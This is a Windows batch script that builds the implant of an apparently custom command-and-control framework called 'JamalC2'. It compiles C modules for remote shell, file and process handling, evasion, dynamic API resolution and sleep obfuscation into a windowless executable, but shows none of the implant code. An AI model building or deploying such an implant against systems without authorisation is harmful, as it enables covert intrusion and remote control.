@echo off
setlocal

echo ========================================
echo   JamalC2 C Implant Build Script
echo ========================================
echo.

:: Find and setup Visual Studio environment
set "VSCMD_START_DIR=%CD%"

:: Try VS 18 Community (found on this system)
if exist "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" (
    echo [*] Found VS 18 Community
    call "C:\Program Files\Microsoft Visual Studio\18\Community\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    goto :compile
)

:: Try VS 2022 BuildTools
if exist "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" (
    echo [*] Found VS 2022 BuildTools
    call "%ProgramFiles%\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul 2>&1
    goto :compile
)

echo [!] Visual Studio Build Tools not found!
pause
exit /b 1

:compile
:: Create output directory
if not exist "build" mkdir build

echo [*] Compiling C Implant...
echo.

cl.exe /O2 /MT /W3 /D_CRT_SECURE_NO_WARNINGS /Fe:build\implant.exe ^
    /I src ^
    src\main.c ^
    src\http.c ^
    src\crypto.c ^
    src\protocol.c ^
    src\shell.c ^
    src\files.c ^
    src\process.c ^
    src\utils.c ^
    src\evasion.c ^
    src\dynapi.c ^
    src\sleep_obf.c ^
    /link ^
    winhttp.lib ^
    advapi32.lib ^
    user32.lib ^
    shell32.lib ^
    /SUBSYSTEM:WINDOWS /ENTRY:mainCRTStartup

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    echo [OK] Build successful!
    echo     Output: build\implant.exe
    echo ========================================
    del *.obj 2>nul
) else (
    echo.
    echo [X] Build failed with error code: %errorlevel%
)

endlocal
pause
